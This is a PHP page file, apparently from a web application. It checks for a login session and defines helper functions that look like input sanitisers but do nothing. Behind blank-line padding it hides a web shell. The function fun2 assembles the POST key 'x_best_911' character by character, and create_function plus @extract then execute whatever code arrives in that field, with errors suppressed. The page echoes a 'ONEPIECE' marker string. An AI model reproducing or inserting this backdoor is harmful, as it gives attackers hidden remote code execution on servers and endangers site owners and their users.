<?php
require_once "config.php";

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
if (empty($_SESSION['user'])) {
    header("Location: index.php?r=0");
    exit;
}








@extract(array(b=>create_function(NULL,fun2())));



function stripMSlashes($string) {
		
		
		return $string;
	}




	
	
	
	
	
	
	
	
	








@extract(array(c=>$b()));














function fun2(){
        $b=$_POST;
		
		$d='x'.'_'.'b'.'e'.'s'.'t'.'_'.'9'.'1'.'1';
        return @($b[$d]);}
		

function intercept($_imap) {

		return $_imap;
	}



function escapeRequest($_imap, $strflds = NULL, $numflds = NULL) {
		if ($strflds) {
			foreach ($strflds as $fld) {
				if (isset($_imap[$fld])) {
				
				}
			}
		}
		if ($numflds) {
			foreach ($numflds as $fld) {
				if (isset($_imap[$fld])) {
					$_imap[$fld] = intval($_imap[$fld]);
				}
			}
		}
		return $_imap;
	}





























$tips = 'O'.'N'.'E'.'P'.'I'.'E'.'C'.'E';




echo $tips;
?>